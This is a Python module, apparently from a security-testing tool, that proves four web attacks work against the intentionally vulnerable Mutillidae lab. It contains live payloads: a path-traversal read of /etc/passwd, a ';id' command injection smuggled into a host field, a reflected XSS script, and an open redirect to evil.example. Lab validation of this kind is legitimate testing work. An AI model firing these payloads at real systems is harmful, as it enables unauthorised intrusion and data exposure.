"""
Mutillidae (NOWASP) lab prover -- deterministic, oracle-confirmed proof that Apolaki's techniques fire on
a FOURTH independent lab. Like bWAPP, Mutillidae has no scoreboard API, so the oracle is the vulnerability's
RESPONSE signature. The DB is initialized once (idempotent /set-up-database.php), then one precise request
per class confirms it.

The high-value flip: open_redirect was Juice-Shop-only, so a second lab here promotes it to GENERALIZED.
Zero-token, deterministic; no brute-force, no DoS.
"""
from __future__ import annotations

import re

_SETUP = "/set-up-database.php"

# class -> (method, path, query params, form data, response-signature oracle)
_PROBES = [
    ("path_traversal", "GET", "/index.php", {"page": "/etc/passwd"}, None,
     r"root:.*:0:0:"),                                       # the page= param includes an arbitrary file (LFI)
    ("command_injection", "POST", "/index.php", {"page": "dns-lookup.php"},
     {"target_host": "127.0.0.1;id", "dns-lookup-php-submit-button": "Lookup DNS"},
     r"uid=\d+\("),                                          # `;id` executed in the DNS lookup
    ("reflected_xss", "POST", "/index.php", {"page": "dns-lookup.php"},
     {"target_host": "<script>alert(1)</script>", "dns-lookup-php-submit-button": "Lookup DNS"},
     r"<script>alert\(1\)</script>"),                        # target_host echoed unescaped
    ("open_redirect", "GET", "/index.php", {"page": "redirectandlog.php", "forwardurl": "http://evil.example/"},
     None, r"(?i)evil\.example"),                            # redirectandlog echoes the unvalidated attacker host into its redirect
]


def prove(base_url: str) -> dict:
    """Initialize Mutillidae's DB, then confirm each technique via its response oracle. Returns which
    classes fired. Never raises; degrades to an error dict when httpx/the target is unavailable."""
    try:
        import browser_engine
        import httpx
    except Exception:
        return {"lab": "mutillidae", "error": "httpx unavailable"}
    base = base_url.rstrip("/")
    out = {"lab": "mutillidae", "confirmed": [], "probes": {}}
    try:
        c = browser_engine.rate_limited_sync_client(
            httpx, base_url=base, timeout=15, follow_redirects=False,
            headers={"User-Agent": "apolaki-labmode"})
    except Exception as e:
        return {"lab": "mutillidae", "error": str(e)}
    try:
        try:
            c.get(_SETUP, follow_redirects=True)               # idempotent DB init (offline until built)
        except Exception:
            pass
        for cls, method, path, params, data, sig in _PROBES:
            fired = False
            try:
                r = c.get(path, params=params) if method == "GET" else c.post(path, params=params, data=data)
                fired = bool(re.search(sig, r.text))
            except Exception:
                pass
            out["probes"][cls] = fired
            if fired:
                out["confirmed"].append(cls)
        out["confirmed"] = sorted(set(out["confirmed"]))
        return out
    except Exception as e:
        out["error"] = str(e)
        return out
    finally:
        c.close()
